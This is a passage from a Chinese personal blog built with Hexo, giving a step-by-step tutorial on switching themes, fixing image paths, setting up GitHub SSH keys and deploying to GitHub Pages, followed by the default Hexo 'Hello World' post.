<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia</span><br></pre></td></tr></table></figure>

<p>下载后的主题在 themes 里面，如图：</p>


<p>回到 blog 文件夹，用记事本打开 <code>_config.yml</code> ,修改里面的 <code>theme: landscape</code> 为 <code>theme: yilia</code><br>之后重新输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean          # 清除所有记录</span><br><span class="line">hexo generate       # 生成静态网页</span><br><span class="line">hexo s              # 本地访问</span><br></pre></td></tr></table></figure>

<p>再访问上面那个本地网址，就可以看到主题已经切换了</p>
<h2 id="解决图片路径问题"><a href="#解决图片路径问题" class="headerlink" title="解决图片路径问题"></a>解决图片路径问题</h2><p>绝大多数资料都是安装hexo-asset-image的插件，但是用到后面会发现对于markdown图片路径没有用啊！比出现问题更折磨人的是遇上一堆错误的解决方法…如果用hexo-asset-image后面可能面临各种各样的报错</p>
<p>我想要寻找在本地和网页上都能显示的办法，终于发现了一款插件<code>hexo-image-link</code>，是将markdown图片路径转换为asset_img语法，使得图片能够同时显示在typora和hexo上。使用命令下载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-image-link --save		或者</span><br><span class="line"></span><br><span class="line">$ npm install -g cnpm --registry=https://registry.npm.taobao.org		下载cnpm</span><br><span class="line">$ cnpm install hexo-image-link --save		使用cnpm下载</span><br></pre></td></tr></table></figure>

<p>接下来还需要修改一下 _config.yml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">post_asset_folder: true</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>之后你只需要学博客是输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new test       # test就是新博客文章的名字</span><br></pre></td></tr></table></figure>

<p>就会在 <code>source/_posts</code> 下，会同时生成test目录和test.md 网页，将需要的图片放置到test目录下，test.md就可以正常解析了。如图：</p>


<h2 id="配置SSH-KEY"><a href="#配置SSH-KEY" class="headerlink" title="配置SSH KEY"></a>配置SSH KEY</h2><p>为什么要配置这个呢？因为你提交代码肯定要拥有你的 github 权限才可以，但是直接使用用户名和密码太不安全了，所以我们使用ssh key来解决本地和服务器的连接问题。<br>先输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh #检查本机是否已存在的ssh密钥</span><br></pre></td></tr></table></figure>

<p>如果提示：<code>No such file or directory</code> 说明你是第一次使用git。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;</span><br></pre></td></tr></table></figure>

<p>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录（C:\用户\你的用户名\），找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，右上角进入设置 -&gt; SSH公钥</p>


<p>在新的SSH密钥那里将我们上面复制的内容粘贴进去即可</p>
<h2 id="测试SSH连接是否成功"><a href="#测试SSH连接是否成功" class="headerlink" title="测试SSH连接是否成功"></a>测试SSH连接是否成功</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com  #注意，&#x27;T&#x27;是大写的</span><br></pre></td></tr></table></figure>

<p>如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi 你的github用户名! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>

<p>看到这个信息说明SSH已配置成功！<br>接下来还需要配置用户名和邮箱：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxx&quot;  #你的 github 用户名，即注册时的用户名，个人主页最大那个就是了</span><br><span class="line">git config --global user.email  &quot;xxx@qq.com&quot;  #填写你的github注册邮箱</span><br></pre></td></tr></table></figure>

<h2 id="github上创建相关库"><a href="#github上创建相关库" class="headerlink" title="github上创建相关库"></a>github上创建相关库</h2><p>接下来讲讲怎么在github上创建相关库</p>




<p>在1的地方填写库名，一定是用户名.github.io</p>
<p>将2的地方勾上，再点击创建即可</p>
<h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><p>如果你一切都配置好了，发布上传很容易，一句 <code>hexo d</code> 就搞定，当然关键还是你要把所有东西配置好。<br>首先，ssh key肯定要配置好。<br>其次，配置_config.yml中有关deploy的部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/用户名/仓库名  #仓库的地址</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<p><code>_config.yml</code>这里面都是一些全局配置，每个参数的意思都比较简单明了，所以就不作详细介绍了。<br>需要特别注意的地方是，冒号后面必须有一个空格，否则可能会出问题。</p>
<p>接下来我们还需要安装一个插件，在 git bash 下输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>这下就搞定啦</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/28/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/28/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-28 16:55:03" itemprop="dateCreated datePublished" datetime="2023-05-28T16:55:03+08:00">2023-05-28</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>367</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">liberator</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">115k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">3:28</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
